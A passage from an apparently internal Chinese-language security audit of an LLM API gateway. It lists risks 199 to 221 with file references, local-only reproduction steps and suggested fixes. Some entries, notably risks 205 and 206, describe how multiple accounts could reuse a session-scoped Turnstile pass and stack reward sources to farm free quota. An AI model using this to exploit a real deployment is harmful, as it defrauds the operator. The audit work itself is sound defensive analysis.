  - `service/channel_select.go:83-162`、`model/channel_cache.go:97-150` 与 `model/ability.go:106-143`：真实路由按请求模型精确查 ability；带空格的 ability 不会匹配正常请求模型，表现为“后台配置看起来有模型，但用户请求无可用渠道”。
  - `relay/helper/price.go:231-239`：是否有模型计费配置按模型名查 ratio/price；带空格或大小写变体会导致同一个上游模型与本地价格配置不匹配，在允许未配置模型或自用模式下会放大计费/展示差异。
  - `web/default/src/features/channels/lib/model-mapping-validation.ts:26-39`、`web/default/src/features/channels/lib/channel-utils.ts:211-249` 与 `web/default/src/features/channels/lib/channel-form.ts:526-559`：前端工具会 trim/filter 空项并格式化列表，这是正向证据；但它只保护正常 UI 流程，不能替代 Admin API 的后端规范化。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:202-222`：Ollama append/replace 通过前端 `parseModelsString` 和 `Set` 去重后写回，这是较干净路径；但后端接收 `models` 字符串时仍不做统一清洗。
- 可能后果：空模型或空分组 ability 会进入 enabled models、missing models 和内存缓存，导致后台模型列表出现空项、模型元数据缺失告警被噪声淹没，或运营误以为某个渠道支持模型但真实请求找不到。带前后空格的模型名会形成与正常模型不同的 ability 和价格 key，用户请求 `gpt-4` 不会命中配置成 `" gpt-4"` 的渠道；如果模型列表展示了带空格项，客户端可能复制错误模型名，进一步制造无法路由或未定价错误。更新渠道时超长模型名可能先写入 `channels.models`，随后 ability 插入因 varchar(255) 失败而返回错误，造成接口显示失败但渠道字段已变化的非原子状态，这与前面模型同步非原子风险会互相叠加。该问题不直接构成充值入账漏洞，但会导致模型售卖面、计费配置和渠道实际能力之间漂移，增加运营误配和故障排查成本。
- 复现思路：本地用 Admin API 新建或更新测试渠道，分别提交 `models="gpt-4,, gpt-3.5 ,,"`、`group="default, test,,"`、`models=""`、`group=""` 和一个超过 255 字符的模型名。观察 `abilities` 表是否出现空 model/group 或带空格值，`/api/channel/models_enabled` 是否返回空/带空格模型，用户 `/v1/models` 在自用模式或允许未配置模型下是否展示畸形模型，正常请求 `gpt-3.5` 是否无法命中带空格 ability。只在本地测试库复现，不修改生产渠道。
- 修复建议：在后端建立唯一的规范化函数，例如 `NormalizeCSVNames(value, maxLen, allowEmpty)`，对 `models`、`group`、token model limits、upstream detected models 等同类字段统一执行 trim、过滤空项、去重、长度校验和非法字符/控制字符拒绝。`validateChannel` 新增和更新都必须调用该函数，并把规范化后的字符串写回 channel；`UpdateAbilities` 和 `InitChannelCache` 应使用 `channel.GetModels()/GetGroups()` 或同一规范化结果，而不是直接 `strings.Split`。对于空模型或空分组应拒绝保存，除非明确支持“无模型渠道”且不会生成 ability。`channels.models` 更新、abilities 重建和缓存刷新应保持事务一致；ability 插入失败时不能留下已保存的畸形 `channels.models`。增加迁移/修复脚本扫描现有空值、空格、重复和超长模型，并输出 dry-run 差异供运营确认。
- 优先级：P2。
- 当前状态：未修复。

### 风险 200：token 模型限制后端允许空/畸形 CSV，前端可能显示“无限制”但运行时拒绝所有模型或错误拒绝授权模型

- 影响范围：普通用户 API token 创建/编辑、token 模型白名单、前端 token 列表和详情、`/v1/models` 可见模型、正式 relay 分发、Redis token 缓存、客户子 key 权限说明、客服排障。
- 触发条件：用户或脚本直接调用 `/api/token/` 创建或更新 token，提交 `model_limits_enabled=true` 且 `model_limits=""`、`","`、`" gpt-4 "`、`"gpt-4, gpt-4o"`、具体 thinking budget/gizmo 变体或其他未规范化模型；旧前端/第三方面板不使用新版 MultiSelect；数据库历史数据已经存在空格或空项；Redis token cache 保存了畸形限制。
- 涉及文件/函数：
  - `controller/token.go:167-225`：`AddToken` 只校验名称、额度和 token 数量，直接把请求中的 `ModelLimitsEnabled`、`ModelLimits`、`Group`、`CrossGroupRetry` 保存到新 token；没有 trim、过滤空项、去重或校验 enabled=true 时至少有一个有效模型。
  - `controller/token.go:258-308`：`UpdateToken` 同样直接覆盖 `ModelLimitsEnabled` 和 `ModelLimits`，没有后端规范化和语义校验。
  - `model/token.go:336-350`：`GetModelLimits()` 仅按逗号 split；`GetModelLimitsMap()` 把 split 后的原始字符串直接作为 map key，不 trim、不过滤空字符串、不按 `FormatMatchingModelName` 规范化。
  - `middleware/auth.go:409-426`：只要 `ModelLimitsEnabled` 为 true，就把 `token.GetModelLimitsMap()` 写入 context；即使 map 为空或只有空字符串 key，也会进入模型限制启用状态。
  - `middleware/distributor.go:57-77`：正式 relay 校验时会把请求模型先 `ratio_setting.FormatMatchingModelName(modelRequest.Model)`，再去 `tokenModelLimit` map 查找；保存端未同样格式化，导致保存具体模型、带空格模型和运行时匹配模型不一致。
  - `controller/model.go:228-248`：`/v1/models` 在 token 模型限制启用时直接遍历 `tokenModelLimit` map 作为可见模型来源；空字符串、带空格模型或未定价模型会被过滤或展示不一致，用户看到的模型面和正式请求拦截可能不同。
  - `setting/ratio_setting/model_ratio.go:731-744`：`FormatMatchingModelName` 会把 Gemini thinking budget、gpt gizmo 等请求模型折叠到通配名；这强化了保存端和执行端必须使用同一规范化策略的要求。
  - `web/default/src/features/keys/lib/api-key-form.ts:103-109`：新版前端正常表单用 `data.model_limits.length > 0` 决定 `model_limits_enabled`，这是正向实现；但它只覆盖该 UI 流程，不能保护直接 API 写入。
  - `web/default/src/features/keys/lib/api-key-form.ts:127-133`：编辑时只 `split(',').filter(Boolean)`，不会 trim；历史 `" gpt-4 "` 会继续进入表单状态并再次保存。
  - `web/default/src/features/keys/components/api-keys-cells.tsx:155-164`：列表展示逻辑在 `model_limits_enabled=true` 但 `model_limits=""` 时显示 `Unlimited`；这与后端运行时“启用限制且空 map，拒绝所有模型”的语义相反。
  - `model/token.go:286-299` 与 `model/token_cache.go:8-18`：更新后的畸形限制会异步写入 Redis token cache，后续请求直接按缓存中的字符串执行。
- 可能后果：一个 token 在后台列表里显示为“Unlimited”，用户或运营以为该 key 可调用所有模型，但正式 relay 因模型限制启用且 allow map 为空而拒绝所有请求，造成“新 key 不可用”的误判和客服问题。带空格的 `model_limits` 会显示为已限制某模型，但执行时请求模型被规范化后查不到 `" gpt-4 "` 这类 key，导致合法模型被错误拒绝。对于 thinking budget/gizmo 这类会被 `FormatMatchingModelName` 折叠的模型，具体变体保存和通配执行之间的精确授权问题已由风险 148 覆盖；本轮新增的是保存端空值/空格/前端展示与运行时语义不一致。该问题通常不会让普通用户绕过模型限制调用高价模型，但会造成错误拒绝、客户授权说明失真和运维排障成本。
- 复现思路：本地用普通用户 session 直接调用 token 创建 API，分别提交 `{model_limits_enabled:true, model_limits:""}`、`{model_limits_enabled:true, model_limits:" gpt-4 "}`、`{model_limits_enabled:true, model_limits:","}`。观察 token 列表中空字符串场景是否显示 Unlimited，`/v1/models` 是否为空或异常，正式请求 `gpt-4` 是否被 403 拒绝。再编辑该 token，确认历史空格项是否会被前端重新保存。只使用本地测试用户和测试 token，不对真实用户 key 做破坏性修改。
- 修复建议：后端保存 token 时复用统一 CSV 规范化函数：trim、过滤空项、去重、拒绝控制字符，并对 enabled=true + 规范化后空列表直接返回错误或自动关闭 `ModelLimitsEnabled`。保存端和执行端必须使用一致的匹配策略：要么保存精确模型并执行精确匹配，要么保存规范化模型并在 UI 明确展示通配语义；建议结构化保存 `{mode:"exact|normalized|wildcard", model:"..."}`。前端列表不要用 `model_limits` 空字符串推断 Unlimited，应同时显示 enabled 状态和有效模型数量；历史数据迁移应扫描 enabled=true 但有效列表为空、带空格项、重复项和无法匹配价格/能力的条目。
- 优先级：P2。
- 当前状态：未修复。

### 风险 205：签到 Turnstile 是 30 天 session 级通过状态且无独立用户级限流，难以约束批量账号长期领取日奖励

- 影响范围：每日签到奖励、批量小号、注册/登录会话、Turnstile 人机校验、全局 API 限流、运营活动成本。
- 触发条件：签到功能开启且奖励额度有运营价值；站点允许批量注册、OAuth 登录或软删后重注册；用户已经在同一浏览器/session 里通过过一次 Turnstile，或站点关闭 Turnstile；攻击者/羊毛党控制多个账号并每天调用 `/api/user/checkin`。
- 涉及文件/函数：
  - `router/api-router.go:119-121`：签到状态是 `GET /api/user/checkin`，签到动作是 `POST /api/user/checkin`，只挂 `middleware.TurnstileCheck()`，没有额外挂 `CriticalRateLimit()` 或用户级签到限流中间件。
  - `router/api-router.go:19`：整组 API 有 `GlobalAPIRateLimit()`，但这是全局 API 级限流，不是按签到动作、用户、设备或奖励额度设计的风控。
  - `middleware/turnstile-check.go:17-25`：`TurnstileCheck` 如果发现 session 中已有 `turnstile` 字段，就直接放行，不再校验新的 Turnstile token。
  - `middleware/turnstile-check.go:26-70`：首次校验成功后写入 `session.Set("turnstile", true)`；这个标记没有绑定具体动作、日期、用户 ID 或奖励请求。
  - `main.go:179-187`：cookie session 的 `MaxAge` 为 2592000 秒，即 30 天；因此一次 Turnstile 成功可在同一 session 内长期复用。
  - `router/api-router.go:68-69`：注册和登录也使用同一个 `TurnstileCheck()`，所以用户登录时通过的人机校验会让后续签到接口直接跳过 Turnstile。
  - `model/checkin.go:16-18` 与 `model/checkin.go:95-119`：数据库唯一索引只保证同一 `user_id + checkin_date` 不重复发奖，无法限制多账号、同设备、多 IP 或同一外部身份重注册后的多次每日奖励。
  - `web/default/src/features/profile/components/checkin-calendar-card.tsx:142-172`、`249-272`、`321-327`：前端默认先无 token 调用签到，只有服务端返回 Turnstile 相关错误时再弹出验证；如果 session 已有 `turnstile` 标记，用户不会看到签到专属挑战。
  - `controller/user.go:122-126`：登出会清空 session，这是正向行为；但正常用户长期登录场景下不会清除 `turnstile` 标记。
- 可能后果：Turnstile 在签到场景里更像“登录/session 已验证”标记，而不是“每次领取奖励的人机挑战”。一个真实用户或脚本只要完成一次登录/注册 Turnstile，在 30 天 session 内每天可无挑战领取签到奖励；多账号场景下，系统只按账号维度限制每天一次，没有按设备、IP、注册身份、支付合规、手机号/邮箱强度或累计奖励金额做额外风控。若叠加风险 201 的 OIDC 软删重注册，或其他批量注册入口，签到会成为持续发放免费额度的羊毛入口。全局 API 限流过宽或关闭时，攻击者还可以批量查询签到状态和提交签到，造成活动成本和日志噪声。
- 复现思路：本地启用签到和 Turnstile，使用浏览器完成一次登录或注册 Turnstile；保持 session 不登出，第二天或手工调整日期后再次调用 `POST /api/user/checkin`，观察是否无需新的 Turnstile token。再创建多个测试账号，用同一客户端依次登录/签到，观察限制是否只落在单账号每日唯一索引上。所有测试使用本地账号和本地配置，不使用生产 Turnstile 或真实用户。
- 修复建议：将签到奖励的人机校验和限流从通用 session 标记中拆出来。可选方案包括：签到请求要求 action-scoped Turnstile token，校验成功只对 `checkin:{user_id}:{date}` 生效；增加用户级、IP/设备级和全局签到频率限制；按账号年龄、邮箱/OAuth 可信度、支付合规状态或历史消费决定是否可签到；对每日签到总发放额度设置全站预算和告警；同一自然人/外部身份删除重注册后不应重复领取同日奖励。Turnstile session 标记仍可用于登录便利，但不应作为资产发放动作的长期通行证。
- 优先级：P2。
- 当前状态：未修复。

### 风险 206：注册赠额、邀请奖励、签到、兑换码和返利缺少统一免费额度预算与用户级总上限，跨来源组合可绕过单点风控

- 影响范围：`QuotaForNewUser`、`QuotaForInvitee`、`QuotaForInviter`、签到奖励、额度型兑换码、邀请充值返利、用户主余额、邀请余额、活动运营预算、客服对账。
- 触发条件：站点同时启用多个免费额度来源，例如新用户赠额、邀请奖励、签到、兑换码活动和邀请充值返利；用户通过多账号、重注册、aff code、兑换码、每日签到或充值返利组合领取；单个来源未超出自身配置，但合计超过运营预期。
- 涉及文件/函数：
  - `common/constants.go:146-151`：新用户赠额、邀请人/被邀请人奖励、邀请充值返利开关和比例是独立全局变量，没有统一预算字段。
  - `setting/operation_setting/checkin_setting.go:5-16`：签到奖励有独立 `Enabled/MinQuota/MaxQuota` 配置，默认配置与注册/邀请/兑换码预算无关联。
  - `model/user.go:512-617`：注册时直接设置 `user.Quota = QuotaForNewUser`，事务后 `FinalizeOAuthUserCreation` 再发放被邀请人和邀请人奖励；这些奖励只写普通日志，没有统一免费额度 ledger。
  - `model/redemption.go:145-201`：额度型兑换码兑换直接增加用户 quota，和注册/签到/邀请奖励没有共享总上限或活动预算。
  - `model/checkin.go:55-119`：签到每日按配置随机发放 quota，并单独写 `checkins` 记录；只限制同一 user_id 同日一次。
  - `model/topup.go:69-119`：邀请充值返利直接累加邀请人的 `aff_quota/aff_history_quota`，不进入统一免费额度预算；后续可通过邀请余额划转转入主余额。
  - `model/log.go:91-107`：当前多条资产来源主要通过文本日志追踪，缺少可按 `source_type/activity_id/natural_identity/day/month` 聚合的资产流水。
  - 检索证据：本轮未在 `model/controller/service` 中发现统一的 `asset_ledger`、`free_quota_budget`、活动预算、用户免费额度总上限或跨来源发放检查。
- 可能后果：单点规则都“看起来合理”，但组合后仍可形成超预算发放。例如新用户先拿注册赠额，再用 aff code 触发邀请奖励，兑换活动码，之后每天签到；如果还能通过 OIDC 软删重注册、重复邮箱、多 OAuth 身份或批量小号扩大账号数，总免费额度会按来源叠加。运营侧很难回答“某个自然人/设备/邮箱/邀请链本月总共拿了多少免费额度”，也无法给活动设置全站日预算或自动熔断。发生异常时，只能分别查注册日志、兑换码、签到记录、用户 aff 字段和 topup 记录，难以及时止损。
- 复现思路：本地启用 `QuotaForNewUser`、`QuotaForInvitee/QuotaForInviter`、签到和额度型兑换码；注册一个带邀请关系的新用户，兑换一个额度码，执行签到，再让邀请人划转返利余额。观察各路径都独立成功，系统没有统一字段展示该用户或邀请链路的免费额度总额，也没有全站活动预算扣减。再结合风险 201 的 OIDC 重注册重复创建账号，观察每个新 user_id 都从零开始计算。
- 修复建议：新增统一资产流水和免费额度预算层。所有免费发放来源都写入同一 `asset_grants` 或 `quota_ledger`，字段包含 `source_type`、`source_id`、`campaign_id`、`user_id`、自然身份标识、delta、前后余额、是否可撤销、创建 IP/设备、request id。引入全站、活动、用户、自然身份、邀请链路的日/月总上限和熔断告警。注册赠额、邀请奖励、签到、兑换码和返利都通过同一服务发放，先检查预算，再写 ledger，再更新余额和缓存。后台配置应显示这些来源的叠加成本，而不是只显示单项开关。
- 优先级：P2。
- 当前状态：未修复。

### 风险 209：用户自助日志统计按 username 聚合而非 user_id，改名或用户名复用后会混入他人/历史账号消费汇总

- 影响范围：`/api/log/self/stat` 自助用量统计、前端 usage logs 统计卡片、用户成本展示、客服对账、用户名变更、管理员硬删除后重建账号、消费日志保留周期和争议处理。
- 触发条件：用户 A 产生消费日志后被管理员改名，或管理员硬删除用户 A 后创建同名用户 B，或历史上存在同名日志残留；新用户或改名后的用户调用 `/api/log/self/stat`，统计函数按 `logs.username` 聚合，而不是按当前 session 的 `user_id` 聚合。
- 涉及文件/函数：
  - `router/api-router.go:315`：`GET /api/log/self/stat` 使用 `middleware.UserAuth()` 后进入 `controller.GetLogsSelfStat`。
  - `controller/log.go:125-134`：`GetLogsSelfStat` 从 session 取 `username := c.GetString("username")`，再调用 `model.SumUsedQuota(..., username, ...)`，没有传入当前 `user_id`。
  - `model/log.go:515-556`：`SumUsedQuota` 使用 `applyExplicitLogTextFilter(tx, "username", username)` 过滤 `logs.username`，并按 `type=LogTypeConsume` 聚合 quota/rpm/tpm。
  - `controller/log.go:36-47` 与 `model/log.go:465-506`：明细接口 `/api/log/self` 使用 `logs.user_id = ?` 过滤当前用户，这是正确对照；同一页面的明细和统计使用了不同归属键。
  - `controller/user.go:578-610` 与 `model/user.go:638-664`：管理员更新用户时允许更新 `username`，并只刷新用户缓存，不回写历史 `logs.username`。
  - `controller/user.go:791-807` 与 `model/user.go:447-452`：管理员删除用户走 `HardDeleteUserById`，会物理删除用户行，`users.username` 唯一索引释放；历史 `logs` 仍保留原 username。
  - `controller/user.go:840-868`：管理员创建用户时可创建新的同名账号，只要当前 `users` 表唯一索引允许。
- 可能后果：用户改名后自助统计可能看不到自己改名前的消费总量，但明细仍能看到旧 user_id 记录，造成前端统计卡片与列表不一致。更严重的是硬删除后同名重建时，新账号的 `/api/log/self/stat` 可能把旧账号同名历史消费汇总进来，泄露旧账号的消费总量、最近 60 秒 RPM/TPM 或误导用户/客服判断额度消耗。运营侧如果用自助统计截图处理争议，可能把历史账号的费用算到当前用户，或者漏算改名前费用。
- 复现思路：在本地测试库创建用户 `alice` 并写入一条 `logs.user_id=<old_id>, username='alice', type=LogTypeConsume, quota>0` 的消费日志；管理员硬删除该用户后创建新的 `alice`，或直接把原用户改名为 `alice2`；用当前账号调用 `/api/log/self` 和 `/api/log/self/stat`。预期明细按 `user_id` 只返回当前用户记录，但统计按 `username` 会混入或漏掉历史 `alice` 日志。该复现只操作本地数据库和本地接口，不调用真实上游。
- 修复建议：为用户自助统计新增 `SumUsedQuotaByUserId` 或给 `SumUsedQuota` 增加可选 `userId` 条件，`/api/log/self/stat` 必须按 `logs.user_id = 当前用户 id` 聚合；`username` 只作为管理员筛选字段。前端和 API 响应应确保统计和明细使用同一归属键。长期建议把 `logs.username` 视为冗余展示快照，不再用于权限或自助归属判断；用户改名/硬删除/重建时不要依赖 username 追踪账务，必要时增加账号生命周期标识或在硬删除前明确处理日志保留策略。
- 优先级：P2。
- 当前状态：未修复。

### 风险 210：管理员用户维度数据看板按 username 聚合和筛选，用户改名或同名重建会合并/拆分历史消费统计

- 影响范围：后台数据看板、`/api/data/users` 用户维度图表、`/api/data?username=...` 管理员筛选、`quota_data`、用户改名、管理员硬删除后重建同名账号、客服对账和运营用户排行。
- 触发条件：用户产生 `quota_data` 后被管理员改名，或管理员硬删除用户后创建同名新用户，或历史上存在同名账号数据；管理员查看用户维度数据看板或按 username 筛选数据看板。
- 涉及文件/函数：
  - `router/api-router.go:321-325`：`/api/data` 和 `/api/data/users` 使用 `AdminAuth()`，`/api/data/self` 使用 `UserAuth()`。
  - `controller/usedata.go:13-18`：管理员 `/api/data` 接收 query `username` 并调用 `model.GetAllQuotaDates(start, end, username)`。
  - `controller/usedata.go:30-33`：管理员 `/api/data/users` 调用 `model.GetQuotaDataGroupByUser`。
  - `controller/usedata.go:61-73`：普通用户 `/api/data/self` 使用当前 session 的 `userId` 并调用 `GetQuotaDataByUserId`，这是正向对照。
  - `model/usedata.go:13-21`：`QuotaData` 同时保存 `UserID` 和 `Username`，其中 `Username` 是消费发生时的快照。
  - `model/usedata.go:37-55`：内存聚合 key 包含 `userId-username-modelName-createdAt`，同一用户改名前后会形成不同 username 快照。
  - `model/usedata.go:77-85` 与 `92-101`：落库 upsert 条件同时包含 `user_id` 和 `username`，不会把改名前后的同一 user_id 自动合并。
  - `model/usedata.go:104-108`：管理员按 username 筛选时只用 `username = ?`，不限定 `user_id`。
  - `model/usedata.go:118-125`：用户维度聚合只 `Select("username, created_at, sum(...)")` 并 `Group("username, created_at")`，没有按 `user_id` 分组。
  - `controller/user.go:578-610` 与 `model/user.go:638-664`：管理员编辑用户时可更新 `username`，不会回写历史 `quota_data.username`。
  - `controller/user.go:791-807` 与 `model/user.go:447-452`：管理员硬删除会释放 `users.username` 唯一索引，允许后续创建同名用户。
- 可能后果：后台用户维度数据看板会把硬删除前旧账号和同名新账号的 `quota_data` 合并成一个 username 统计，导致管理员误判新用户历史消耗、模型使用量和成本归属。用户改名后，同一个 user_id 的历史消费会在后台按旧名和新名拆成两条用户曲线，客服对账时可能漏看旧名消耗。普通用户自助 `/api/data/self` 当前按 user_id 查询，不会直接泄露他人明细；风险集中在管理员后台运营统计和客服判断。
- 复现思路：本地创建用户 `alice` 并产生一条 `quota_data(user_id=1, username='alice')`；管理员硬删除该用户后新建同名 `alice` 并产生 `quota_data(user_id=2, username='alice')`；调用 `/api/data/users`，观察结果按 username 合并两位用户的统计。再测试把 user_id=2 改名为 `alice2` 后继续消费，观察同一用户在 `/api/data/users` 中拆成 `alice` 和 `alice2` 两组。该复现只使用本地数据库和本地接口。
- 修复建议：管理员用户维度数据看板应按 `user_id` 作为归属主键聚合，响应中同时返回 `user_id`、当前 username、历史 username 快照和必要的 deleted/renamed 标记。按用户名筛选时应先解析到当前用户 ID，或明确提供“按历史 username 快照搜索”的模式，并在结果中展示所有匹配的 user_id。`quota_data.username` 应仅作为展示快照，不应用作用户归属主键。硬删除用户前应提示该 user_id 的历史统计保留策略，必要时建立用户生命周期表避免同名复用混淆。
- 优先级：P2。
- 当前状态：未修复。

### 风险 219：新增渠道 key 规范化不一致，空白 key 可导致“成功但未创建”或创建不可用渠道

- 标题：新增渠道只校验原始 `channel.Key` 非空；普通 batch 模式不 trim key 就创建渠道，`multi_to_single` 模式 trim 后若没有剩余 key 仍会走空批量插入并返回 success，导致后台操作结果与真实渠道资产不一致
- 影响范围：后台新增渠道、批量新增渠道、多 key 合并渠道、渠道能力表、渠道缓存、自动测试/自动禁用、运维批量导入 key、供应商 key 可用性排查
- 触发条件：管理员批量导入 key 时包含只含空格/制表符的行、前后带空格的 key，或在多 key 合并模式中粘贴了空白内容；前端校验被绕过、脚本调用接口、从表格/密钥管理器复制时带隐形空白字符
- 涉及文件/函数：
  - `controller/channel.go:456-470`：`validateChannel` 在新增时只检查 `channel == nil || channel.Key == ""`，不会 `TrimSpace` 后再判断，也不会校验清洗后的 key 数量
  - `controller/channel.go:587-633`：`AddChannel` 的 `multi_to_single` 普通渠道分支会逐行 `TrimSpace` 并跳过空 key，但没有在 `len(cleanKeys)==0` 时返回错误；随后 `keys = []string{addChannelRequest.Channel.Key}`
  - `controller/channel.go:637-640`：batch 模式的普通渠道直接 `strings.Split(addChannelRequest.Channel.Key, "\n")`，没有 trim 每个 key；只含空格的行会作为非空 key 继续创建渠道，前后带空格的真实 key 也会被原样保存
  - `controller/channel.go:660-675`：创建渠道列表时只跳过 `key == ""`，不会跳过 `strings.TrimSpace(key)==""`，也不会修剪普通 batch key
  - `model/channel.go:455-459`：`BatchInsertChannels` 对空 slice 直接返回 nil；因此 `multi_to_single` 清洗后没有任何 key 时，控制器仍可能返回 `success: true`
  - `model/channel.go:516-566`：更新已有多 key 渠道时会用旧 key 计算 `MultiKeySize`，这是正向保护；本风险聚焦新增路径的清洗/空结果问题
  - `web/default/src/features/channels/lib/channel-form.ts:450-520`：前端编辑时空 key 不会发给后端，这是正向保护；但后端仍需要防脚本/API 直接提交和批量粘贴脏数据
- 可能后果：管理员看到“新增渠道成功”，但实际没有创建任何渠道，或创建了 key 为 `"   "`、`" sk-xxx "` 这类不可用渠道；后续渠道测试、自动测试、真实用户请求会失败并可能触发自动禁用，运营排查时会把问题误判为供应商故障。批量导入大量 key 时，少数空白/带空格 key 会混入生产渠道池，造成随机失败、重试切换、成本归因噪声和客服工单。这个问题不直接导致充值入账或用户扣费异常，但会让渠道可用性和后台操作结果失真。
- 复现思路：本地以 Admin 调用新增渠道接口：`mode=multi_to_single` 且 `channel.key` 为若干空格/换行，观察接口是否返回 success 但 `channels` 未新增；再用 `mode=batch` 提交 `"   \n sk-test "`，观察是否创建空格 key 或带空格 key 的渠道。只使用本地假 key，不提交真实 provider key。
- 修复建议：新增渠道前先统一规范化 key 列表：对普通 key 使用 `strings.TrimSpace`，对 JSON key 使用结构化解析后 canonical marshal；任何模式下清洗后 key 数为 0 必须返回错误。batch 和 multi_to_single 应复用同一 key parser，并返回 `created_count/skipped_count/invalid_lines`，不要空批量成功。对 Codex/Vertex JSON key 应区分“单个 JSON 对象”和“JSON 数组”，避免用普通换行逻辑处理结构化凭证。后端应补充 API 级测试覆盖空白 key、带空格 key、重复 key、JSON key 和多 key 合并。
- 优先级：P2
- 当前状态：已确认新增路径 key 清洗不一致，`BatchInsertChannels(nil)` 会让空结果成功；尚未补充后端校验测试。

### 风险 220：`/api/pricing` 会把未配置计费的 enabled 模型按默认 37.5 倍率展示，和真实 `/v1/models`/relay 可用性不一致

- 标题：价格页聚合忽略 `GetModelRatio` 的 success，未配置价格/倍率且存在 abilities 的模型会被当成正常 token 计费模型展示
- 影响范围：公开/登录价格页 `/api/pricing`、模型广场、用户模型认知、客服售前说明、ratio sync 读取 NewAPI pricing、未配置模型、空 tiered expr 模型、上游自动同步新增模型
- 触发条件：渠道 abilities 中存在 enabled 模型；该模型没有 `ModelPrice`、没有有效 `ModelRatio`，或 `billing_mode=tiered_expr` 但表达式为空/缺失；站点没有开启自用模式，普通用户也未开启接受未配置模型；价格页模块开启
- 涉及文件/函数：
  - `controller/model.go:208-248`：`/v1/models` 在非自用模式下会调用 `helper.HasModelBillingConfig` 过滤未配置计费的模型；token 模型限制分支也执行同样过滤
  - `relay/helper/price.go:67-104`：真实 relay 计费在未找到价格/倍率且用户不接受未配置模型时返回 `modelPriceNotConfiguredError`，默认 fail closed
  - `model/pricing.go:288-318`：`updatePricing` 从 enabled abilities 构建 `/api/pricing`，若找不到 `ModelPrice`，直接调用 `ratio_setting.GetModelRatio(model)`，但忽略 `success`，把返回的 `modelRatio` 写入 `pricing.ModelRatio`
  - `setting/ratio_setting/model_ratio.go:401-421`：`GetModelRatio` 对未配置模型返回 `37.5, operation_setting.SelfUseModeEnabled, name`；自用模式关闭时 `success=false`，但调用方如果忽略 success 仍会得到 37.5
  - `controller/pricing.go:36-65`：`GetPricing` 只按用户可用 group 过滤，不按 `HasModelBillingConfig` 或 `SelfUseModeEnabled` 过滤未配置计费模型
  - `middleware/header_nav.go:104-122` 与 `router/api-router.go:33`：价格页模块开启且不要求登录时，`HeaderNavModuleAuth("pricing")` 会 `TryUserAuth` 后公开返回 `/api/pricing`
  - `web/default/src/features/pricing/hooks/use-pricing-data.ts:27-56`：前端直接使用 `/api/pricing` 的 `data` 作为模型列表
  - `web/default/src/features/pricing/lib/price.ts:88-107` 与 `web/default/src/features/pricing/components/pricing-columns.tsx:149-188`：价格列按 `model.model_ratio` 计算并展示 token 价格，无法区分“默认 37.5 但未配置”的模型
  - `controller/model_list_test.go:157-210`：测试已经覆盖 `/v1/models` 会排除空 tiered expr、缺失 expr 和未定价模型，但 `model.GetPricing()` 仍包含这些模型且 `BillingMode/BillingExpr` 为空
- 可能后果：普通用户在价格页看到某模型有正常价格和可用 group，以为可以购买/调用；真实 `/v1/models` 不展示，直接请求又返回未配置价格错误，形成“页面售卖但 API 不可用”的运营事故。更严重的是，上游模型自动同步或脏 abilities 把供应商实验/高价模型带入 enabled abilities 后，即使计费未审核，价格页也会按默认 37.5 展示，弱化运营对“未定价模型不得公开”的防线。若其他 NewAPI 实例或自动化脚本以 `/api/pricing` 作为同步来源，可能把这个默认 37.5 当成真实定价继续传播。
- 复现思路：本地关闭 `SelfUseModeEnabled`，创建 enabled ability `zz-unpriced-model` 且不配置 `ModelPrice/ModelRatio`；调用 `/v1/models` 观察该模型被过滤或请求时返回价格未配置；再调用 `/api/pricing` 观察该模型仍出现在 `data`，`quota_type=0` 且 `model_ratio=37.5`。对空 `tiered_expr` 模型也可用 `controller/model_list_test.go` 中的模式复现。
- 修复建议：`updatePricing` 构建价格页时复用 `helper.HasModelBillingConfig`，或至少检查 `GetModelRatio` 的 success；自用模式关闭且模型没有有效价格/倍率/非空 tiered expr 时，不应进入公开 pricing data。若为了运营排障需要展示，应显式标记 `pricing_status=unconfigured`，不计算默认价格，并只在 Admin 模型元数据页展示。ratio sync 消费 `/api/pricing` 时也应拒绝来源里的默认占位价格或要求 pricing status。增加回归测试：未配置 enabled 模型不应出现在 `/api/pricing` 的普通用户/匿名响应中。
- 优先级：P2
- 当前状态：已确认 `/v1/models` 和 relay fail closed，但 `/api/pricing` 展示层会把未配置模型包装成默认 37.5 倍率；尚未修复。

### 风险 221：模型 metadata 更新接口可写入空名称规则，空 prefix/contains/suffix 会匹配并污染整个价格页模型集

- 标题：`CreateModelMeta` 校验模型名非空，但 `UpdateModelMeta` 全量更新不校验 `model_name`、`name_rule` 和 endpoints 语义；直接 API 可把一条模型元数据改成空名称规则并影响所有缺少精确 metadata 的 enabled 模型
- 影响范围：Admin 模型元数据、`/api/pricing` 模型广场、模型详情 code samples、`supported_endpoint` 全局映射、`GetModelSupportEndpointTypes`、missing models 同步、用户对模型能力/端点的认知、客服报价和文档示例
- 触发条件：管理员通过旧前端、脚本、被盗 Admin session/access token 或直接 API 调用 `/api/models` 更新模型；提交 `id` 有效但 `model_name=""`，并把 `name_rule` 设为 prefix/contains/suffix；或提交任意 JSON endpoints、异常 status；前端表单的最小长度和 JSON 校验被绕过
- 涉及文件/函数：
  - `controller/model_meta.go:72-86`：`CreateModelMeta` 明确拒绝空 `ModelName`
  - `controller/model_meta.go:90-125`：`UpdateModelMeta` 只要求 `Id != 0`，全量更新分支没有复用空名称校验、`name_rule` 范围校验或 endpoints 业务 schema 校验
  - `model/model_meta.go:77-84`：`Model.Update` 使用 `Select("model_name", ..., "endpoints", "status", "sync_official", "name_rule", ...)` 强制保存零值，因此空字符串和 0/异常状态都可落库
  - `model/pricing.go:120-146`：`updatePricing` 会把非 exact metadata 按 prefix/suffix/contains 规则匹配 enabled abilities；`strings.HasPrefix(model, "")`、`strings.Contains(model, "")`、`strings.HasSuffix(model, "")` 对所有模型都成立
  - `model/pricing.go:288-305`：匹配到的 metadata 若 `Status != 1`，对应模型会被直接跳过，不返回给 `/api/pricing`
  - `model/pricing.go:219-246` 与 `model/pricing.go:263-280`：metadata `Endpoints` 会覆盖匹配模型的 supported endpoint types，并写入公开的 `supported_endpoint` 路径/方法映射；它影响价格页和 code samples，但本轮未发现它直接改变 relay 路由
  - `controller/model_meta.go:177-323`：Admin 模型列表的 rule enrichment 也按 pricing 缓存回填 matched models、endpoint/group/quota/channel 并集，空规则会让后台看到异常的大范围匹配
  - `web/default/src/features/models/lib/model-form.ts:27-38` 和 `web/default/src/features/models/lib/model-utils.ts:168-176`：新版前端会要求 `model_name` 非空且 endpoints 是 JSON，这是正向路径，但不能保护直接 API/旧前端/脚本
